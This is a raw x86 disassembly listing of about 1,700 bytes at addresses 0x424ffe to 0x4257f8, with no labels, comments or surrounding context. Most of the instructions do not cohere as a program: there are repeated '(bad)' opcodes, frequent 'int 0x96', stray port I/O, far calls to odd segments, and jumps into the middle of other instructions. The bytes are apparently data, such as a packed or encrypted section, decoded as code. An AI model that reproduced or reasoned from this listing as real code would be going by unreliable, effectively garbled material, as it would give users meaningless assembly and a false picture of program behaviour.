  424ffe:	sub    edx,edx
  425000:	int    0x96
  425002:	cmc    
  425003:	dec    ebp
  425004:	inc    edi
  425005:	outs   dx,DWORD PTR ds:[esi]
  425006:	add    BYTE PTR [eax-0x69322dcd],0x11
  42500d:	xor    edx,edx
  42500f:	int    0x96
  425011:	in     eax,dx
  425012:	push   ebx
  425013:	sar    BYTE PTR [ebx],cl
  425015:	fisubr DWORD PTR [ecx-0x27]
  425018:	ret    
  425019:	add    BYTE PTR [eax],al
  42501b:	clc    
  42501c:	test   ebp,0x72c34c96
  425022:	push   ds
  425023:	add    BYTE PTR [eax+0x76cdf133],0xbd
  42502a:	int    0xd6
  42502c:	mov    ch,0x33
  42502e:	leave  
  42502f:	das    
  425030:	sar    DWORD PTR [ecx+0x69],1
  425033:	fisttp DWORD PTR [edx]
  425035:	xchg   ecx,eax
  425036:	mov    ebx,ebp
  425038:	popa   
  425039:	add    BYTE PTR [eax-0x6a893680],0x9b
  425040:	push   esp
  425041:	add    BYTE PTR [eax+0x2d9d76c9],0x6f
  425048:	add    BYTE PTR [eax+0x1ad76c9],0xa4
  42504f:	add    BYTE PTR [eax-0x7e5a8937],0x80
  425056:	add    BYTE PTR [eax+0x3ba5a6cd],0xda
  42505d:	pop    ebp
  42505e:	call   0xcdf4:0xf880806f
  425065:	xchg   esi,eax
  425066:	lods   eax,DWORD PTR ds:[esi]
  425067:	int    0xa6
  425069:	mov    BYTE PTR [ebx-0x2e],dl
  42506c:	int    0x96
  42506e:	popf   
  42506f:	xor    edx,edx
  425071:	int    0x96
  425073:	xchg   ebp,eax
  425074:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  425076:	push   eax
  425077:	add    BYTE PTR [eax-0x302d2ed1],0x5
  42507e:	mov    BYTE PTR [eax+0x2c],bl
  425081:	ret    0xafd
  425084:	jbe    0x42501b
  425086:	int    0x76
  425088:	icebp  
  425089:	int    0x96
  42508b:	or     eax,0xf3f7f534
  425090:	int    0x96
  425092:	xchg   ebp,eax
  425093:	xor    al,0x23
  425095:	inc    esp
  425096:	test   DWORD PTR [ebp+edx*8-0x7c],ecx
  42509a:	inc    esi
  42509b:	or     DWORD PTR [eax+eiz*1+0x4d7d76cd],eax
  4250a2:	rol    esi,0x80
  4250a5:	add    BYTE PTR [edi-0x59328a8a],0x6d
  4250ac:	cmp    ebx,edx
  4250ae:	clc    
  4250af:	hlt    
  4250b0:	int    0x96
  4250b2:	gs mov edi,0xc3d9
  4250b8:	ss aaa 
  4250ba:	push   esi
  4250bb:	add    BYTE PTR [eax+0xc56d233],0x6d
  4250c2:	add    BYTE PTR [eax],al
  4250c4:	xchg   DWORD PTR [ebp-0x33],edi
  4250c7:	jbe    0x4250c6
  4250c9:	int    0x96
  4250cb:	stc    
  4250cc:	sub    edx,edx
  4250ce:	int    0x96
  4250d0:	cmc    
  4250d1:	dec    ebp
  4250d2:	inc    edi
  4250d3:	outs   dx,DWORD PTR ds:[esi]
  4250d4:	add    BYTE PTR [eax-0x69322dcd],0x11
  4250db:	xor    edx,edx
  4250dd:	int    0x96
  4250df:	in     eax,dx
  4250e0:	push   ebx
  4250e1:	sar    BYTE PTR [ebx],cl
  4250e3:	(bad)  
  4250e5:	hlt    
  4250e6:	int    0x96
  4250e8:	dec    esp
  4250e9:	xor    esi,ecx
  4250eb:	int    0x76
  4250ed:	mov    ebp,0x33b5a6cd
  4250f2:	leave  
  4250f3:	das    
  4250f4:	rol    ebp,1
  4250f6:	int    0xdb
  4250f8:	xor    ebx,DWORD PTR [ebp-0x1dbc5679]
  4250fe:	das    
  4250ff:	pop    es
  425100:	pop    esp
  425101:	add    BYTE PTR [eax],al
  425103:	add    BYTE PTR [edx-0x2d349c58],ch
  425109:	mov    BYTE PTR [eax+0x4edcd96],al
  42510f:	in     eax,dx
  425110:	jo     0x4250db
  425112:	jbe    0x4250e4
  425114:	xchg   ecx,eax
  425115:	aaa    
  425116:	ficom  WORD PTR [ebx]
  425118:	pop    ebp
  425119:	mov    ebp,0xa25230a
  42511e:	jbe    0x425175
  425120:	leave  
  425121:	jbe    0x425180
  425123:	mov    esi,0xa13de37
  425128:	jbe    0x42518f
  42512a:	leave  
  42512b:	jbe    0x42519a
  42512d:	fidiv  WORD PTR [edi]
  42512f:	ficom  WORD PTR [ebx]
  425131:	or     dh,BYTE PTR [esi+0x75]
  425134:	pop    ebx
  425135:	leave  
  425136:	jbe    0x4251b5
  425138:	scas   al,BYTE PTR es:[edi]
  425139:	aaa    
  42513a:	ficom  WORD PTR [ebx]
  42513c:	or     dh,BYTE PTR [esi+0xd]
  42513f:	cwde   
  425140:	call   0xde37:0x96f176c9
  425147:	adc    ecx,DWORD PTR [edx]
  425149:	jbe    0x4250e0
  42514b:	cmp    ebx,edx
  42514d:	cmp    eax,DWORD PTR [eax]
  42514f:	pop    edi
  425150:	dec    ecx
  425151:	and    DWORD PTR [esi-0x628936cb],eax
  425157:	out    0x37,al
  425159:	ficom  WORD PTR [ebx]
  42515b:	jp     0x425167
  42515d:	jbe    0x425104
  42515f:	int    0xd3
  425161:	or     dl,BYTE PTR [esi-0x4a19f513]
  425167:	iret   
  425168:	xchg   ecx,eax
  425169:	add    DWORD PTR [ecx+edx*1],0x28add3ff
  425170:	push   ebx
  425171:	ror    bh,cl
  425173:	je     0x42513c
  425175:	ror    ch,1
  425177:	xor    ch,cl
  425179:	pushf  
  42517a:	test   BYTE PTR [edi],ch
  42517c:	inc    ebp
  42517d:	loop   0x425111
  42517f:	shr    esp,cl
  425181:	xchg   edx,eax
  425182:	int    0x1c
  425184:	int    0x6c
  425186:	test   BYTE PTR [ebx],bh
  425188:	ins    DWORD PTR es:[edi],dx
  425189:	adc    bh,bl
  42518b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42518c:	mov    esi,0xf1534229
  425191:	or     dl,BYTE PTR [esi-0x6893207]
  425197:	xchg   DWORD PTR [ebp-0x2d],ebp
  42519a:	in     eax,0x28
  42519c:	inc    ebx
  42519d:	jbe    0x4251eb
  42519f:	das    
  4251a0:	or     BYTE PTR [edi-0x327f7f80],bh
  4251a6:	jbe    0x4251a1
  4251a8:	add    al,0xb6
  4251aa:	mov    ebp,0x11e60a80
  4251af:	int    0x76
  4251b1:	stc    
  4251b2:	push   es
  4251b3:	ins    DWORD PTR es:[edi],dx
  4251b4:	aam    0xb6
  4251b6:	cmp    ebp,DWORD PTR [ebp+0xa]
  4251b9:	out    0xf5,al
  4251bb:	int    0x96
  4251bd:	mov    ebp,0xcf88a6cd
  4251c2:	fs xor ch,cl
  4251c5:	xchg   esi,eax
  4251c6:	mov    BYTE PTR [edi-0x5269f527],al
  4251cc:	retf   0x922
  4251cf:	xchg   esi,eax
  4251d0:	add    ch,cl
  4251d2:	xchg   esi,eax
  4251d3:	stc    
  4251d4:	xchg   ecx,ebx
  4251d6:	retf   0x2014
  4251d9:	int    0xa6
  4251db:	lods   eax,DWORD PTR ds:[esi]
  4251dc:	or     DWORD PTR [ebx],ebx
  4251de:	retf   0x96
  4251e1:	int    0xa6
  4251e3:	stc    
  4251e4:	xchg   ecx,esp
  4251e6:	int    0xe6
  4251e8:	mov    BYTE PTR [ecx],cl
  4251ea:	adc    al,0x43
  4251ec:	int    0x96
  4251ee:	cmc    
  4251ef:	ins    BYTE PTR es:[edi],dx
  4251f0:	add    al,0xea
  4251f2:	std    
  4251f3:	sar    DWORD PTR [ebp-0x7b2dfbd8],cl
  4251f9:	push   ebx
  4251fa:	sar    BYTE PTR [ebx],cl
  4251fc:	ror    DWORD PTR [edx],cl
  4251fe:	jbe    0x4251f5
  425200:	push   ecx
  425201:	(bad)  
  425202:	cmc    
  425203:	int    0x96
  425205:	cmc    
  425206:	add    al,0x11
  425208:	call   ebx
  42520a:	repz xchg edx,eax
  42520c:	shr    DWORD PTR [ebp-0x322dacd8],cl
  425212:	xchg   esi,eax
  425213:	stc    
  425214:	inc    ebx
  425215:	rol    BYTE PTR [edx+0x7a003ba7],cl
  42521b:	int    0x76
  42521d:	adc    ebp,ecx
  42521f:	xchg   esi,eax
  425220:	stc    
  425221:	int    0xa6
  425223:	mov    ebp,0xcffdad04
  425228:	test   cl,dh
  42522a:	int    0x96
  42522c:	stc    
  42522d:	iret   
  42522e:	adc    al,0x5b
  425230:	int    0xa6
  425232:	dec    esp
  425233:	shl    ebx,cl
  425235:	sub    BYTE PTR [ebx-0x2e],dl
  425238:	cmp    edx,ebx
  42523a:	or     dh,BYTE PTR [esi+0x11]
  42523d:	push   ecx
  42523e:	(bad)  
  42523f:	adc    ebp,ecx
  425241:	xchg   esi,eax
  425242:	adc    DWORD PTR [ecx+edx*1],eax
  425245:	call   ebx
  425247:	repz xchg edx,eax
  425249:	shr    DWORD PTR [ebp-0x322dacd8],cl
  42524f:	xchg   esi,eax
  425250:	stc    
  425251:	xchg   edx,ebx
  425253:	xor    esp,edx
  425255:	or     dh,BYTE PTR [esi-0x43]
  425258:	inc    ebx
  425259:	lds    ebp,FWORD PTR [edi]
  42525b:	pop    es
  42525c:	outs   dx,DWORD PTR ds:[esi]
  42525d:	add    BYTE PTR [eax],al
  42525f:	add    ch,cl
  425261:	jbe    0x425250
  425263:	int    0x96
  425265:	mov    ch,0x4
  425267:	jmp    0xd384:0xd2046cfd
  42526e:	mov    ebp,0x3bd25328
  425273:	ror    ebp,cl
  425275:	popf   
  425276:	int    0xf1
  425278:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  42527e:	in     eax,0x28
  425280:	or     dl,BYTE PTR [esi-0x6d0c2c4b]
  425286:	or     ah,BYTE PTR [esi-0x12697613]
  42528c:	add    al,0xe6
  42528e:	in     eax,dx
  42528f:	xchg   BYTE PTR [edi],ch
  425291:	or     edx,DWORD PTR [ebp-0x55ffff01]
  425297:	test   al,0x63
  425299:	retf   
  42529a:	ror    BYTE PTR [eax-0x12326980],cl
  4252a0:	add    al,0xed
  4252a2:	adc    al,0xcd
  4252a4:	jbe    0x42522e
  4252a6:	leave  
  4252a7:	jbe    0x4252ba
  4252a9:	dec    ecx
  4252aa:	and    DWORD PTR [esi-0x28936cb],eax
  4252b0:	inc    ecx
  4252b1:	and    DWORD PTR [esi+0x5b80cd35],eax
  4252b7:	cwde   
  4252b8:	or     dh,BYTE PTR [esi-0x7]
  4252bb:	leave  
  4252bc:	jbe    0x4252b3
  4252be:	into   
  4252bf:	and    DWORD PTR [esi+0x76c99a35],eax
  4252c5:	in     eax,dx
  4252c6:	inc    esi
  4252c7:	sbb    DWORD PTR [ebp-0x22932de],esi
  4252cd:	int    0x8d
  4252cf:	std    
  4252d0:	sar    bh,0x5d
  4252d3:	shl    DWORD PTR [ecx],1
  4252d5:	xchg   BYTE PTR ds:0xd3f03baa,dh
  4252db:	repnz sub BYTE PTR [ebx],bh
  4252de:	adc    ebx,edx
  4252e0:	out    dx,eax
  4252e1:	xchg   edx,eax
  4252e2:	push   ebx
  4252e3:	add    cl,ch
  4252e5:	lea    edx,[ecx]
  4252e7:	int    0x96
  4252e9:	adc    DWORD PTR [ebx],edi
  4252eb:	jge    0x425328
  4252ed:	(bad)  
  4252ef:	jmp    0x425283
  4252f1:	shr    edx,cl
  4252f3:	sub    BYTE PTR [ebx+0x13],dl
  4252f6:	das    
  4252f7:	rol    DWORD PTR [edx],1
  4252f9:	jmp    0x42529a
  4252fb:	add    BYTE PTR [eax-0x6723280],0xcd
  425302:	xchg   esi,eax
  425303:	stc    
  425304:	cmp    ebx,ecx
  425306:	shr    edx,cl
  425308:	sub    BYTE PTR [ebx],bh
  42530a:	jge    0x4252df
  42530c:	jmp    0x4252a0
  42530e:	push   ebx
  42530f:	adc    ecx,ebp
  425311:	xchg   esi,eax
  425312:	std    
  425313:	int    0xa6
  425315:	std    
  425316:	cmp    esi,ecx
  425318:	cmp    esp,ecx
  42531a:	shl    ebx,cl
  42531c:	xchg   edx,eax
  42531d:	shl    ebp,cl
  42531f:	sub    BYTE PTR [ebx-0x2b],dl
  425322:	push   es
  425323:	adc    ecx,ebp
  425325:	xchg   esi,eax
  425326:	stc    
  425327:	int    0x8d
  425329:	stc    
  42532a:	aam    0x58
  42532c:	cmp    esi,eax
  42532e:	shl    edx,cl
  425330:	sub    BYTE PTR [ebx],bh
  425332:	icebp  
  425333:	shl    ebx,cl
  425335:	xchg   edx,eax
  425336:	push   ebx
  425337:	jecxz  0x425306
  425339:	(bad)  
  42533a:	std    
  42533b:	int    0xa6
  42533d:	std    
  42533e:	cmp    edi,DWORD PTR [ebp+0x3b]
  425341:	loope  0x425316
  425343:	jmp    0x4252d7
  425345:	shl    ebp,cl
  425347:	sub    BYTE PTR [ebx+0xc],dl
  42534a:	aad    0xf3
  42534c:	int    0x8d
  42534e:	in     eax,dx
  42534f:	int    0xa6
  425351:	in     eax,dx
  425352:	cmp    edi,DWORD PTR [ebp+0x3b]
  425355:	loope  0x42532a
  425357:	jmp    0x4252eb
  425359:	shl    ebp,cl
  42535b:	sub    BYTE PTR [ebx+0xc],dl
  42535e:	cmp    esp,ebx
  425360:	in     al,dx
  425361:	sub    al,0x3b
  425363:	lock shl edx,cl
  425366:	sub    BYTE PTR [ebx],bh
  425368:	icebp  
  425369:	shl    ebx,cl
  42536b:	xchg   edx,eax
  42536c:	push   ebx
  42536d:	jecxz  0x42533c
  42536f:	(bad)  
  425370:	std    
  425371:	int    0xa6
  425373:	std    
  425374:	cmp    edi,DWORD PTR [ebp+0x3b]
  425377:	loope  0x42534c
  425379:	jmp    0x42530d
  42537b:	shl    ebp,cl
  42537d:	sub    BYTE PTR [ebx+0xc],dl
  425380:	aad    0xf3
  425382:	or     dl,BYTE PTR [esi-0x2723207]
  425388:	int    0x96
  42538a:	std    
  42538b:	cmp    edi,DWORD PTR [ebp+0x3b]
  42538e:	(bad)  
  425390:	jmp    0x425324
  425392:	shr    edx,cl
  425394:	sub    BYTE PTR [ebx+0x13],dl
  425397:	xchg   DWORD PTR [edx],eax
  425399:	int    0x8d
  42539b:	cmc    
  42539c:	int    0x96
  42539e:	cmc    
  42539f:	cmp    ebx,ecx
  4253a1:	cmp    edi,DWORD PTR [ebp-0x2d]
  4253a4:	jmp    0x1353:0x92ebd328
  4253ab:	int    0x96
  4253ad:	std    
  4253ae:	int    0xa6
  4253b0:	std    
  4253b1:	cmp    esi,ecx
  4253b3:	cmp    esp,ecx
  4253b5:	shl    ebp,cl
  4253b7:	sub    bl,dl
  4253b9:	repz xchg edx,eax
  4253bb:	push   ebx
  4253bc:	aad    0x33
  4253be:	adc    eax,DWORD PTR [ebx+0x2]
  4253c1:	das    
  4253c2:	pop    es
  4253c3:	pop    edx
  4253c4:	add    BYTE PTR [eax],al
  4253c6:	add    ch,cl
  4253c8:	jbe    0x4253c3
  4253ca:	int    0x8d
  4253cc:	mov    BYTE PTR [edx-0x327ef558],ch
  4253d2:	jbe    0x4253cd
  4253d4:	arpl   bx,cx
  4253d6:	rol    BYTE PTR [eax+eax*4+0x3bedcd96],cl
  4253dd:	ins    DWORD PTR es:[edi],dx
  4253de:	pop    esi
  4253df:	jbe    0x42542d
  4253e1:	aam    0x3a
  4253e3:	pop    esi
  4253e4:	jbe    0x42536e
  4253e6:	fdiv   DWORD PTR [edx]
  4253e8:	retf   0x8814
  4253eb:	or     DWORD PTR [esi-0x69a6d0d1],edx
  4253f1:	das    
  4253f2:	adc    dh,bl
  4253f4:	in     eax,dx
  4253f5:	add    BYTE PTR [eax+0x2f960980],0xf1
  4253fc:	lea    ebp,[edi]
  4253fe:	retf   0x2f96
  425401:	or     DWORD PTR [eax+ecx*4],edx
  425404:	ins    BYTE PTR es:[edi],dx
  425405:	inc    ebx
  425406:	jbe    0x425390
  425408:	sub    BYTE PTR [ecx+0x7188d600],0xbd
  42540f:	stc    
  425410:	std    
  425411:	add    BYTE PTR [eax],al
  425413:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425414:	ror    BYTE PTR [eax-0x12326980],cl
  42541a:	adc    ch,ch
  42541c:	cmp    al,0x84
  42541e:	add    BYTE PTR [eax+0x49bf985b],0x21
  425425:	xchg   BYTE PTR ds:0xc911a60a,dh
  42542b:	jbe    0x42542a
  42542d:	inc    ecx
  42542e:	and    DWORD PTR [esi-0x128936cb],eax
  425434:	dec    ecx
  425435:	sub    DWORD PTR [esi-0x4a8936cb],eax
  42543b:	jno    0x4253f3
  42543d:	cli    
  42543e:	arpl   bp,cx
  425440:	jbe    0x425453
  425442:	int    0x8d
  425444:	adc    DWORD PTR [edx+0x77cfffc0],ebx
  42544a:	sub    DWORD PTR [edx-0xfc486c5],0xd392bdd3
  425454:	repnz sub BYTE PTR [ebx-0x2d],dl
  425458:	or     dh,BYTE PTR [esi-0x7]
  42545b:	leave  
  42545c:	jbe    0x425403
  42545e:	into   
  42545f:	and    DWORD PTR [esi-0x628936cb],eax
  425465:	inc    esi
  425466:	sbb    DWORD PTR [ebp-0x528936de],esi
  42546c:	mov    BYTE PTR [eax-0x34327f80],al
  425472:	int    0x76
  425474:	std    
  425475:	int    0x8d
  425477:	std    
  425478:	cmp    esi,eax
  42547a:	shl    edx,cl
  42547c:	sub    BYTE PTR [ebx],bh
  42547e:	jns    0x425453
  425480:	mov    ebp,0xcdd35392
  425485:	lea    edx,[ecx]
  425487:	int    0x96
  425489:	adc    DWORD PTR [ebx],edi
  42548b:	(bad)  
  42548d:	(bad)  
  42548f:	jmp    0x425423
  425491:	shr    edx,cl
  425493:	sub    BYTE PTR [ebx+0x13],dl
  425496:	das    
  425497:	rcl    ebx,1
  425499:	in     al,dx
  42549a:	outs   dx,BYTE PTR ds:[esi]
  42549b:	int    0x76
  42549d:	cmc    
  42549e:	int    0x8d
  4254a0:	cmc    
  4254a1:	sar    DWORD PTR [ebp-0x6d0d2cd8],cl
  4254a7:	push   ebx
  4254a8:	sar    DWORD PTR [ebx],cl
  4254aa:	lds    ecx,FWORD PTR [edx]
  4254ac:	jbe    0x4254a7
  4254ae:	iret   
  4254af:	jbe    0x4254aa
  4254b1:	jo     0x425470
  4254b3:	mov    ecx,0xa0000fe
  4254b8:	jbe    0x4254b3
  4254ba:	int    0x76
  4254bc:	stc    
  4254bd:	int    0x8d
  4254bf:	cmc    
  4254c0:	or     al,BYTE PTR ds:0xfc9dcf
  4254c6:	add    ch,cl
  4254c8:	jbe    0x4254c7
  4254ca:	int    0x8d
  4254cc:	std    
  4254cd:	cmp    edi,DWORD PTR [ecx+0x3b]
  4254d0:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4254d7:	push   ebx
  4254d8:	rol    DWORD PTR [edi+0x760af576],cl
  4254de:	cmc    
  4254df:	int    0x76
  4254e1:	in     eax,dx
  4254e2:	int    0x8d
  4254e4:	in     eax,dx
  4254e5:	cmp    esi,eax
  4254e7:	shl    edx,cl
  4254e9:	sub    BYTE PTR [ebx],bh
  4254eb:	jns    0x4254c0
  4254ed:	mov    ebp,0xcdd35392
  4254f2:	(bad)  
  4254f3:	std    
  4254f4:	int    0x96
  4254f6:	std    
  4254f7:	cmp    ecx,DWORD PTR [edi]
  4254f9:	cmp    ebx,ecx
  4254fb:	shr    ebx,cl
  4254fd:	xchg   edx,eax
  4254fe:	shr    edx,cl
  425500:	sub    BYTE PTR [ebx+0x13],dl
  425503:	xor    edx,ebx
  425505:	int    0x8d
  425507:	cmc    
  425508:	inc    ebx
  425509:	jge    0x4254e3
  42550b:	mov    bl,0xcd
  42550d:	jbe    0x4254c4
  42550f:	int    0x8d
  425511:	mov    ch,0x3b
  425513:	jns    0x425550
  425515:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42551c:	push   ebx
  42551d:	ror    DWORD PTR [edx],cl
  42551f:	jbe    0x42551a
  425521:	leave  
  425522:	jbe    0x425511
  425524:	bound  ebx,QWORD PTR [edi]
  425526:	xchg   BYTE PTR ds:0x1ebddcd,dh
  42552c:	add    BYTE PTR [eax-0x5a723280],0xcd
  425533:	jbe    0x4254da
  425535:	cmp    ecx,ecx
  425537:	shr    DWORD PTR [ebp-0x2cf0c4d8],cl
  42553d:	jmp    0x4254d1
  42553f:	push   ebx
  425540:	jge    0x42550f
  425542:	jbe    0x42553d
  425544:	aad    0xbd
  425546:	or     dh,BYTE PTR [esi-0x63]
  425549:	int    0x76
  42554b:	mov    dl,cl
  42554d:	or     BYTE PTR [ecx],0x76
  425550:	in     al,dx
  425551:	retf   0xec76
  425554:	int    0x8d
  425556:	stc    
  425557:	das    
  425558:	pop    ecx
  425559:	ins    DWORD PTR es:[edi],dx
  42555a:	cmp    edx,ebx
  42555c:	or     dh,BYTE PTR [esi-0xb]
  42555f:	int    0x76
  425561:	in     eax,dx
  425562:	int    0x8d
  425564:	in     eax,dx
  425565:	cmp    edi,DWORD PTR [ecx-0x2d]
  425568:	mov    ebp,0xd3f03b92
  42556d:	repnz sub BYTE PTR [ebx-0x2d],dl
  425571:	int    0x8d
  425573:	cmc    
  425574:	sub    edx,ebx
  425576:	int    0x5
  425578:	push   es
  425579:	popf   
  42557a:	cld    
  42557b:	add    BYTE PTR [eax],al
  42557d:	int    0x8d
  42557f:	popf   
  425580:	cmp    edx,ebx
  425582:	or     dh,BYTE PTR [esi-0x7]
  425585:	int    0x76
  425587:	std    
  425588:	int    0x8d
  42558a:	std    
  42558b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42558e:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  425595:	push   ebx
  425596:	rol    DWORD PTR [ecx+0x76cd8876],cl
  42559c:	std    
  42559d:	int    0x8d
  42559f:	std    
  4255a0:	cmp    edi,DWORD PTR [ecx+0x3b]
  4255a3:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4255aa:	push   ebx
  4255ab:	sar    DWORD PTR [esi],cl
  4255ad:	jbe    0x42555c
  4255af:	int    0x76
  4255b1:	adc    ebp,ecx
  4255b3:	lea    edx,[ecx]
  4255b5:	cmp    esi,eax
  4255b7:	cmp    edi,DWORD PTR [ecx-0x2d]
  4255ba:	repnz sub bl,dl
  4255bd:	mov    ebp,0xcdd35392
  4255c2:	lea    ebp,[ebp+0x62f7d43]
  4255c8:	imul   eax,DWORD PTR [eax],0x0
  4255cb:	add    ch,cl
  4255cd:	jbe    0x425584
  4255cf:	int    0x8d
  4255d1:	mov    ch,0x3b
  4255d3:	jns    0x425610
  4255d5:	lock shl edx,cl
  4255d8:	sub    bl,dl
  4255da:	mov    ebp,0xd353aa92
  4255df:	int    0x8d
  4255e1:	stc    
  4255e2:	test   al,0x3b
  4255e4:	shl    DWORD PTR [ebx-0x35],cl
  4255e7:	rol    BYTE PTR [eax+eax*4+0x4edcd96],cl
  4255ee:	in     eax,dx
  4255ef:	xor    BYTE PTR [ebx],bh
  4255f1:	retf   
  4255f2:	pop    ebx
  4255f3:	call   0xbb05:0x2f888d5e
  4255fa:	add    BYTE PTR [eax+0x2f024380],0x5
  425601:	rol    DWORD PTR [eax-0x44d07f80],1
  425607:	cwde   
  425608:	sub    al,0x5d
  42560a:	lahf   
  42560b:	xor    eax,0x8d0a8080
  425610:	std    
  425611:	or     cl,BYTE PTR [ebp+0xaf13b11]
  425617:	(bad)  
  425618:	stc    
  425619:	mov    eax,0xe3b813cd
  42561e:	retf   
  42561f:	cmp    eax,DWORD PTR [eax]
  425621:	leave  
  425622:	jbe    0x425619
  425624:	adc    al,0x80
  425626:	add    BYTE PTR [eax+0x77fa43b8],0xc4
  42562d:	mov    eax,0xb8fde6cd
  425632:	jecxz  0x4255fd
  425634:	mov    eax,0xbb2ff93b
  425639:	(bad)  
  42563a:	stc    
  42563b:	iret   
  42563c:	dec    esp
  42563d:	into   
  42563e:	mov    eax,0xd692de5e
  425643:	pop    edx
  425644:	das    
  425645:	mov    ebx,0xf58d0a89
  42564a:	mov    eax,0x4dd67d43
  42564f:	das    
  425650:	mov    ebx,0xa6cdfd8d
  425655:	mov    BYTE PTR [ecx],al
  425657:	fs push ds
  425659:	adc    ah,0x3b
  42565c:	das    
  42565d:	mov    ebx,0xa6cdfd8d
  425662:	mov    BYTE PTR [eax+0x1e4c692f],bh
  425668:	mov    eax,0x3bb8d3e3
  42566d:	jge    0x425627
  42566f:	pop    esi
  425670:	(bad)  
  425671:	cmc    
  425672:	aam    0x23
  425674:	leave  
  425675:	jbe    0x42566c
  425677:	sbb    BYTE PTR [eax+0x76008080],al
  42567d:	stc    
  42567e:	int    0x7d
  425680:	mov    eax,0xb82c8e3b
  425685:	jecxz  0x425652
  425687:	mov    eax,0x82f98d5e
  42568c:	inc    ecx
  42568d:	in     al,dx
  42568e:	dec    edx
  42568f:	add    BYTE PTR [esi+0x11],dh
  425692:	leave  
  425693:	jbe    0x42568a
  425695:	push   ss
  425696:	add    BYTE PTR [eax-0x1944d080],0xfd
  42569d:	int    0xa6
  42569f:	mov    BYTE PTR [ebx],bh
  4256a1:	retf   
  4256a2:	pop    esp
  4256a3:	dec    esp
  4256a4:	sub    dl,ah
  4256a6:	push   ss
  4256a7:	add    BYTE PTR [esi-0x3],dh
  4256aa:	add    al,0xe6
  4256ac:	cmc    
  4256ad:	sbb    BYTE PTR [edi],ch
  4256af:	push   es
  4256b0:	jb     0x4256b2
  4256b2:	add    BYTE PTR [eax],al
  4256b4:	cmp    ebp,DWORD PTR [ebp-0x56]
  4256b7:	arpl   bx,cx
  4256b9:	rol    BYTE PTR [eax+eax*4-0x47ee7233],cl
  4256c0:	jecxz  0x425695
  4256c2:	mov    eax,0x6d3b7d3b
  4256c7:	mov    eax,0x2f2c8e43
  4256cc:	adc    eax,0x96b9ec6d
  4256d1:	int    0xed
  4256d3:	add    al,0xed
  4256d5:	mov    esp,0xc09a985b
  4256da:	inc    esp
  4256db:	add    dh,dl
  4256dd:	mov    ch,cl
  4256df:	adc    DWORD PTR [ebp+0xf90b],edi
  4256e5:	iret   
  4256e6:	js     0x42571a
  4256e8:	or     dh,BYTE PTR [esi+0x25]
  4256eb:	iret   
  4256ec:	js     0x425762
  4256ee:	or     dh,BYTE PTR [esi+0x2d]
  4256f1:	iret   
  4256f2:	js     0x4256ac
  4256f4:	or     dh,BYTE PTR [esi+0x35]
  4256f7:	iret   
  4256f8:	pop    es
  4256f9:	or     DWORD PTR [eax+0x760a8080],eax
  4256ff:	cmp    eax,0x804107cf
  425704:	add    BYTE PTR [eax-0x30ba89f6],0x7
  42570b:	or     eax,0xa808080
  425710:	jbe    0x4256e2
  425712:	iret   
  425713:	pop    es
  425714:	out    dx,eax
  425715:	add    BYTE PTR [eax+0x55760a80],0xcf
  42571c:	pop    es
  42571d:	xor    BYTE PTR [ecx+0x760a8080],al
  425723:	pop    ebp
  425724:	iret   
  425725:	pop    es
  425726:	inc    edx
  425727:	add    DWORD PTR [eax+0x65760a80],0xcf1dd60a
  425731:	pop    es
  425732:	xchg   esp,eax
  425733:	add    DWORD PTR [eax+0x6d760a80],0x813d07cd
  42573d:	add    BYTE PTR [eax-0x25c4af33],0xa
  425744:	xchg   esi,eax
  425745:	icebp  
  425746:	or     dl,BYTE PTR [esi-0x6269f56b]
  42574c:	or     dl,BYTE PTR [esi+0x7d76c9a5]
  425752:	(bad)  
  425753:	mov    cl,0xde
  425755:	adc    ebx,DWORD PTR [ebp-0x43]
  425758:	or     ah,BYTE PTR [ebx]
  42575a:	and    eax,0xcd0d760a
  42575f:	lea    edi,[ebp-0x33]
  425762:	out    0xd,al
  425764:	cmp    edi,ecx
  425766:	adc    al,BYTE PTR [edx]
  425768:	jnp    0x4257a1
  42576a:	ficom  WORD PTR [ebx]
  42576c:	das    
  42576d:	inc    ebp
  42576e:	cli    
  42576f:	xchg   edx,eax
  425770:	rcl    DWORD PTR [eax],cl
  425772:	xchg   edx,eax
  425773:	or     ah,dh
  425775:	mov    ch,0xcd
  425777:	out    0x7d,al
  425779:	int    0xa6
  42577b:	or     eax,0x3be1cd
  425780:	cmp    eax,DWORD PTR [ebx]
  425782:	shl    ebp,cl
  425784:	sub    BYTE PTR [ebx-0x10],dl
  425787:	int    0xe6
  425789:	mov    ch,0x61
  42578b:	add    BYTE PTR [eax-0x1dc49380],0x53
  425792:	cld    
  425793:	push   ebx
  425794:	lock or dl,dh
  425797:	stc    
  425798:	das    
  425799:	add    eax,0x808080f2
  42579e:	adc    dh,BYTE PTR [esi-0xf]
  4257a1:	(bad)  
  4257a2:	mov    esp,0xeb5f8bbd
  4257a7:	or     ah,BYTE PTR [ebx]
  4257a9:	and    eax,0x12958d31
  4257ae:	jbe    0x42574d
  4257b0:	(bad)  
  4257b1:	mov    esp,0x8d318790
  4257b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4257b7:	int    0x8d
  4257b9:	jge    0x425788
  4257bb:	(bad)  
  4257bc:	or     eax,0xcd7de6cd
  4257c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257c2:	or     eax,0x212113b
  4257c7:	jnp    0x425800
  4257c9:	ficom  WORD PTR [ebx]
  4257cb:	das    
  4257cc:	inc    ebp
  4257cd:	add    dl,BYTE PTR [edx-0x2cd7162d]
  4257d3:	out    dx,eax
  4257d4:	xchg   edx,eax
  4257d5:	cmp    ebx,ebp
  4257d7:	cmp    eax,DWORD PTR [ebx]
  4257d9:	push   ebx
  4257da:	or     al,0x53
  4257dc:	clc    
  4257dd:	add    al,0xd3
  4257df:	add    BYTE PTR [ecx+ebx*4],al
  4257e2:	add    BYTE PTR [edx],cl
  4257e4:	lea    edi,[ebp+0xa]
  4257e7:	(bad)  
  4257e8:	or     eax,0x53f18dcd
  4257ed:	lea    edx,[ebp+0x761223d4]
  4257f3:	icebp  
  4257f4:	mov    edx,DWORD PTR [ebx]
  4257f6:	dec    edx
  4257f7:	stc    
  4257f8:	pop    edi
